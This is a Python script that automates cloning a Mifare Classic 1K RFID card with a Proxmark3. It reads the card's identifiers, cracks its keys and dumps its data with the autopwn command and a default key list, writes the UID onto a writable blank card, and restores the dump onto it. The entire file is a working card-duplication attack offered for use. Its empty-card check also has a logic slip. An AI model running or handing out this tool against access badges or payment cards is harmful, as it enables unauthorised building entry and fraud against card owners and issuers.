#!/usr/bin/env python3

import pm3
from output_grabber import OutputGrabber

out = OutputGrabber()
p=pm3.pm3()

uid_retrieve = None
atqa_retrieve = None
sak_retrieve = None
autopwned = False
second_uid_set = False

print("Device:", p.name)

# RETRIEVE PHASE
with out:
    p.console("hf search")

# Retrieves the UID ATQA and SAK of the Mifare Classic 1K
with open("debug.txt", "a") as f:
    f.writelines("RETRIEVE PHASE:\n")
    for line in out.capturedtext.split('\n'):
        if "UID: " in line:
            line = line.replace("[32m", "").replace("[0m", "")
            uid = line.split('UID:')[1].strip().split()[0:4]
            uid_retrieve = ''.join(uid)
            print(uid_retrieve)
            f.writelines(uid_retrieve[0:8]+"\n")
        elif "ATQA: " in line:
            line = line.replace("[32m", "").replace("[0m", "")
            atqa = line.split('ATQA:')[1].strip().split()[0:4]
            atqa_retrieve = ''.join(atqa)
            print(atqa_retrieve)
            f.writelines(atqa_retrieve[0:4]+"\n")
        elif "SAK: " in line:
            line = line.replace("[32m", "").replace("[0m", "")
            sak = line.split('SAK:')[1].strip().split()[0:4]
            sak_retrieve = ''.join(sak)[0:2]
            print(sak_retrieve)
            f.writelines(sak_retrieve+"\n")
    f.close()

    print(uid_retrieve, atqa_retrieve, sak_retrieve)


# AUTOPWN PHASE
if (uid_retrieve or atqa_retrieve or sak_retrieve) == None:
    print("No card identified")
    pass
else:
    out = OutputGrabber()
    print("Running autopwn...")
    with out:
        p.console("hf mf autopwn -f mfc_default_keys")

    with open("debug.txt", "a") as f:
        f.writelines("AUTOPWN PHASE:\n")
        for line in out.capturedtext.split('\n'):
            f.writelines(line+"\n")
            if "Saved" in line:
                print(line)
                autopwned = True


# CSETUID PHASE
if autopwned:
    input("Press enter once second card has been loaded")

    csetuid = f"hf mf csetuid -u {uid_retrieve} -a {atqa_retrieve} -s {sak_retrieve}"
    
    out = OutputGrabber()
    print("Setting UID onto second card...")
    with out:
        p.console(csetuid)
    
    with open("debug.txt", "a") as f:
        f.writelines("CSETUID PHASE:\n")
        for line in out.capturedtext.split('\n'):
            f.writelines(line+"\n")
            if "New UID" in line:
                second_uid_set = True
    

# CLONING PHASE
if second_uid_set == True:
    out = OutputGrabber()
    print("Cloning card...")
    with out:
        p.console("hf mf restore")
    with open("debug.txt", "a") as f:
        f.writelines("CLONING PHASE:\n")
        for line in out.capturedtext.split('\n'):
            f.writelines(line+"\n")
        f.writelines("---------------------------\n")



        